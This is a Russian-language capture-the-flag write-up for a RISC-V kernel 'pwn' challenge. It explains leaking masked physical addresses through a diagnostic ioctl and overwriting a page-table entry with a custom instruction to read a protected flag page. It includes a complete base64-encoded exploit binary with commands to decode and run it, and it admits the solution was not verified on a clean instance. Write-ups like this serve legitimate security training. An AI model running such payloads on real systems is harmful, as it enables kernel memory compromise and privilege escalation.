# GhostVector

**Турнир:** Кубок CTF России 2026 · **Категория:** pwn

**Статус:** Флаг восстановлен; первый байт восстановлен по известному префиксу.

## Кратко

Диагностический ioctl раскрывает адрес PTE и страницы флага. Кастомная инструкция позволяет подменить PTE и отобразить защищённую страницу.

## Решение

### 1. Разбираем диагностический ioctl

В образе есть `/usr/bin/vecdiag`, `/dev/ghostvector` и `/usr/lib/ghostvector/fw.hex`. Реверс `vecdiag` и `ghostvector_lab.ko` показывает, что ioctl `0xc0184702` принимает структуру размером 24 байта. Первое 64-битное поле задаёт пользовательский виртуальный адрес; следующие два поля возвращают телеметрию для физического адреса leaf PTE и страницы флага.

Оба адреса замаскированы XOR с `0x9d37c4b1a62ef059`:

```text
pte_pa = telemetry_pte ^ 0x9d37c4b1a62ef059
flag_pa = telemetry_flag ^ 0x9d37c4b1a62ef059
```

Нужно запросить уже отображённую и затронутую scratch-страницу, например `0x40000000`. Значение PTE для отображения `flag_pa` с пользовательскими правами чтения и записи равно `(flag_pa >> 2) | 0xd7`.

### 2. Перезаписываем PTE кастомной инструкцией

Скрытый helper выполняет `vsetivli zero,1,e8,m1,ta,ma`, затем инструкцию `0x00b5700b`. Существенно, что используется `e8`: один вызов записывает один байт, где `a0` — физический адрес назначения, а младший байт `a1` — данные. Записываем PTE в физический слот восемью вызовами:

```text
for i = 0..7:
    a0 = pte_pa + i
    a1 = (pte_value >> (8*i)) & 0xff
    execute 0x00b5700b
```

Переключение scratch-отображения в режим только чтения через `mprotect` сбрасывает закэшированную трансляцию. После этого чтение из `0x40000000` возвращает страницу флага. Ниже — RISC-V payload, использующий только системные вызовы. Его нужно запустить из shell на чистом инстансе; после флага в выводе идут нулевые байты.

```sh
base64 -d > /home/user/gvsolve <<'PAYLOAD'
f0VMRgIBAQAAAAAAAAAAAAIA8wABAAAAeAABAAAAAABAAAAAAAAAAAAAAAAAAAAABQAAAEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAKAIAAAAAAAAoAgAAAAAAAAAQAAAAAAAANwUAQBMFBQC3FQAAk4UFABMGMACTBiADEwfw/5MHAACTCOANcwAAACMABQATAQH8twIAQJOCAgAjMFEAIzQBACM4AQATBcD5lwUAAJOFBRQTBgAAkwYAAJMIgANzAAAAEwQFABMFBAC3RRjAk4UlcBMGAQCTCNABcwAAAIMygQADMwEBlwMAAJODQxKDswMAs8JyADNDcwATUyMAE2NzDVfwAMwThQIAE14DAJN1/g8LcLUAE4USABNegwCTdf4PC3C1ABOFIgATXgMBk3X+DwtwtQAThTIAE16DAZN1/g8LcLUAE4VCABNeAwKTdf4PC3C1ABOFUgATXoMCk3X+DwtwtQAThWIAE14DA5N1/g8LcLUAE4VyABNegwOTdf4PC3C1ADcFAEATBQUAtxUAAJOFBQATBhAAkwggDnMAAAATBRAAtwUAQJOFBQATBgAIkwgABHMAAAATBQAAkwjQBXMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvZGV2L2dob3N0dmVjdG9yAAAAAAAAAAAAAAAAAAAAAFnwLqaxxDed
PAYLOAD
chmod +x /home/user/gvsolve
/home/user/gvsolve
```

## Флаг

Флаг найден.

Во время проб первый байт страницы оказался затёрт. Payload вывел строку без первого символа; префикс восстановлен по проверке `flagd`. На чистом инстансе решение не проверялось.
